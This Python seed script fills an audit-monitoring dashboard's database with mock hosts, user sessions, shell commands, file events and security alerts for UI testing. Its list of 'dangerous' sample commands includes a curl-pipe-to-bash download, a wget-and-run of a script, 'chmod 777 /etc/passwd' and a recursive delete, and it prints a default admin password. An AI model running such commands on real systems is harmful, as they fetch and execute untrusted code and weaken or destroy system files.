#!/usr/bin/env python3
"""
scripts/seed.py — Populate AuditVisual DB with mock data for UI testing.
Run AFTER containers are up:
  docker exec auditvisual-api python /app/seed.py
"""

import sqlite3
import time
import json
import random

import os

DB_PATH = "/data/auditvisual.db" if os.path.exists("/data") else "data/auditvisual.db"
conn = sqlite3.connect(DB_PATH)
conn.row_factory = sqlite3.Row

# ─── Clear existing data ──────────────────────────────────────────────────────
conn.executescript("""
DELETE FROM commands;
DELETE FROM file_events;
DELETE FROM alerts;
DELETE FROM sessions;
DELETE FROM nodes;
""")
conn.commit()
print("Cleared existing data")

# ─── Mock Nodes ───────────────────────────────────────────────────────────────
nodes = []
node_data = [
    ("web-prod-01", "10.0.1.10", "online", time.time() - 10),
    ("web-prod-02", "10.0.1.11", "online", time.time() - 15),
    ("db-main-01", "10.0.2.50", "online", time.time() - 5),
    ("cache-redis-01", "10.0.3.20", "offline", time.time() - 3600 * 2),
]

for hostname, ip, status, last_seen in node_data:
    cur = conn.execute(
        "INSERT INTO nodes (hostname, ip_address, status, last_seen) VALUES (?,?,?,?)",
        (hostname, ip, status, last_seen)
    )
    nodes.append(cur.lastrowid)

conn.commit()
print(f"Created {len(nodes)} mock nodes")

# ─── Mock users ───────────────────────────────────────────────────────────────
USERS = [
    {"name": "alice",   "auid": 1001},
    {"name": "bob",     "auid": 1002},
    {"name": "charlie", "auid": 1003},
    {"name": "devops",  "auid": 1004},
]

# ─── Time helpers ─────────────────────────────────────────────────────────────
now = time.time()
def ago(hours=0, minutes=0, days=0):
    return now - (days * 86400) - (hours * 3600) - (minutes * 60)

# ─── Create sessions ─────────────────────────────────────────────────────────
sessions = []

session_data = [
    # (user_idx, login_ago_hours, duration_min, ip, terminal)
    (0, 0.5, None,  "192.168.1.10", "ssh"),   # alice active now
    (1, 2,   90,    "192.168.1.20", "ssh"),
    (2, 5,   30,    "10.0.0.5",     "ssh"),
    (3, 8,   120,   "172.16.0.100", "ssh"),
    (0, 26,  45,    "192.168.1.10", "ssh"),
    (1, 28,  60,    "192.168.1.20", "ssh"),
    (3, 50,  200,   "172.16.0.100", "ssh"),
    (0, 75,  30,    "192.168.1.10", "console"),
    (2, 100, 15,    "10.0.0.5",     "ssh"),
]

for u_idx, login_hrs, dur, ip, term in session_data:
    u = USERS[u_idx]
    login_ts = ago(hours=login_hrs)
    logout_ts = (login_ts + dur * 60) if dur else None
    node_id = random.choice(nodes)
    cur = conn.execute(
        "INSERT INTO sessions (node_id, username, auid, login_time, logout_time, ip, terminal) VALUES (?,?,?,?,?,?,?)",
        (node_id, u["name"], u["auid"], login_ts, logout_ts, ip, term)
    )
    sessions.append({"id": cur.lastrowid, "node_id": node_id, "user": u, "login_ts": login_ts, "logout_ts": logout_ts})

conn.commit()
print(f"Created {len(sessions)} sessions")

# ─── Create commands ──────────────────────────────────────────────────────────
NORMAL_CMDS = [
    ("ls",    ["-la"],              0),
    ("cd",    ["/var/log"],         0),
    ("cat",   ["/etc/hosts"],       0),
    ("grep",  ["-r", "error", "."], 0),
    ("tail",  ["-f", "/var/log/nginx/access.log"], 0),
    ("ps",    ["aux"],              0),
    ("df",    ["-h"],               0),
    ("free",  ["-m"],               0),
    ("top",   ["-b", "-n", "1"],    0),
    ("vim",   ["/etc/nginx/nginx.conf"], 0),
    ("git",   ["status"],           0),
    ("git",   ["log", "--oneline", "-20"], 0),
    ("docker",["ps"],               0),
    ("nginx", ["-t"],               0),
    ("systemctl", ["status", "nginx"], 0),
]

SUDO_CMDS = [
    ("sudo",  ["-i"],                           0,  "sudo_cmd"),
    ("bash",  [],                               0,  "cmd_exec"),   # after sudo -i
    ("systemctl", ["restart", "nginx"],         0,  "cmd_exec"),
    ("apt-get",   ["update"],                   0,  "cmd_exec"),
    ("apt-get",   ["install", "-y", "htop"],    0,  "cmd_exec"),
]

DANGER_CMDS = [
    ("wget",  ["https://example.com/setup.sh"],          0, "download_tool"),
    ("bash",  ["setup.sh"],                              0, "cmd_exec"),
    ("curl",  ["https://api.example.com", "|", "bash"],  0, "download_tool"),
    ("chmod", ["777", "/etc/passwd"],                    0, "cmd_exec"),
    ("rm",    ["-rf", "/var/cache"],                     0, "cmd_exec"),
]

total_cmds = 0
for sess in sessions:
    u = sess["user"]
    login_ts = sess["login_ts"]
    logout_ts = sess["logout_ts"] or (login_ts + 3600)
    duration = logout_ts - login_ts
    num_cmds = random.randint(8, 40)

    for i in range(num_cmds):
        ts = login_ts + (duration / num_cmds) * i + random.uniform(0, 30)
        did_sudo = (u["name"] in ("devops", "alice") and i == 5)

        if did_sudo:
            # sudo -i sequence
            for cmd, args, uid, key in SUDO_CMDS[:3]:
                conn.execute(
                    """INSERT INTO commands (node_id, session_id, timestamp, username, auid, effective_uid,
                       effective_user, command, args, exe, key)
                       VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                    (sess["node_id"], sess["id"], ts, u["name"], u["auid"], uid,
                     "root" if uid == 0 else u["name"],
                     cmd, json.dumps(args), f"/usr/bin/{cmd}", key)
                )
                ts += random.uniform(10, 60)
                total_cmds += 1
        elif u["name"] == "charlie" and i == 10:
            # charlie does something suspicious
            cmd_data = random.choice(DANGER_CMDS)
            cmd, args, uid, key = cmd_data
            conn.execute(
                """INSERT INTO commands (node_id, session_id, timestamp, username, auid, effective_uid,
                   effective_user, command, args, exe, key)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                (sess["node_id"], sess["id"], ts, u["name"], u["auid"], uid,
                 "root" if uid == 0 else u["name"],
                 cmd, json.dumps(args), f"/usr/bin/{cmd}", key)
            )
            total_cmds += 1
        else:
            cmd_data = random.choice(NORMAL_CMDS)
            cmd, args, uid = cmd_data
            conn.execute(
                """INSERT INTO commands (node_id, session_id, timestamp, username, auid, effective_uid,
                   effective_user, command, args, exe, key)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                (sess["node_id"], sess["id"], ts, u["name"], u["auid"], uid,
                 u["name"], cmd, json.dumps(args), f"/usr/bin/{cmd}", "cmd_exec")
            )
            total_cmds += 1

conn.commit()
print(f"Created {total_cmds} commands")

# ─── File events ──────────────────────────────────────────────────────────────
file_events = [
    (sessions[0]["id"], USERS[0]["auid"], "alice", ago(hours=0.3), "/etc/nginx/nginx.conf", "write", "log_access"),
    (sessions[1]["id"], USERS[1]["auid"], "bob",   ago(hours=2.5), "/etc/passwd",            "read",  "passwd_change"),
    (sessions[2]["id"], USERS[2]["auid"], "charlie",ago(hours=5.1),"/etc/sudoers",            "write", "sudoers_change"),
    (sessions[3]["id"], USERS[3]["auid"], "devops", ago(hours=8.5),"/root/.ssh/authorized_keys","write","root_ssh"),
]

for sess_id, auid, username, ts, path, action, key in file_events:
    # Find node_id from sessions
    node_id = next(s["node_id"] for s in sessions if s["id"] == sess_id)
    conn.execute(
        "INSERT INTO file_events (node_id, session_id, timestamp, username, auid, path, action, key) VALUES (?,?,?,?,?,?,?,?)",
        (node_id, sess_id, ts, username, auid, path, action, key)
    )

conn.commit()
print(f"Created {len(file_events)} file events")

# ─── Alerts ───────────────────────────────────────────────────────────────────
alerts = [
    (ago(hours=0.4), "charlie", 1003, "CRITICAL", "suspicious_cmd",
     "Suspicious command: curl pipe to bash — `curl https://api.example.com | bash`", 0),
    (ago(hours=0.5), "charlie", 1003, "HIGH",     "sensitive_file",
     "Sudoers file modified: /etc/sudoers", 0),
    (ago(hours=2.3), "bob",     1002, "HIGH",     "sensitive_file",
     "Password file accessed: /etc/passwd", 0),
    (ago(hours=5.0), "charlie", 1003, "MEDIUM",   "sudo_escalation",
     "charlie used chmod to escalate privileges", 0),
    (ago(hours=8.0), "devops",  1004, "HIGH",     "sensitive_file",
     "Root SSH key accessed: /root/.ssh/authorized_keys", 0),
    (ago(hours=12),  "unknown", None, "HIGH",     "brute_force",
     "Brute force detected: 5 failed logins from 203.0.113.42 in 5min", 0),
    (ago(days=1),    "alice",   1001, "MEDIUM",   "sudo_escalation",
     "alice used sudo to escalate privileges", 1),  # resolved
    (ago(days=2),    "bob",     1002, "LOW",       "suspicious_cmd",
     "Suspicious command: wget shell script — `wget https://releases.example.com/app.sh`", 1),
]

for ts, username, auid, severity, alert_type, desc, resolved in alerts:
    node_id = random.choice(nodes)
    conn.execute(
        """INSERT INTO alerts (node_id, timestamp, username, auid, severity, alert_type, description, resolved)
           VALUES (?,?,?,?,?,?,?,?)""",
        (node_id, ts, username, auid, severity, alert_type, desc, resolved)
    )

conn.commit()
print(f"Created {len(alerts)} alerts")

conn.close()
print("\n✅ Seed completed! Open http://localhost:7432")
print("Login: admin / ChangeMe@2024! (or whatever you set in ADMIN_PASSWORD in .env)")
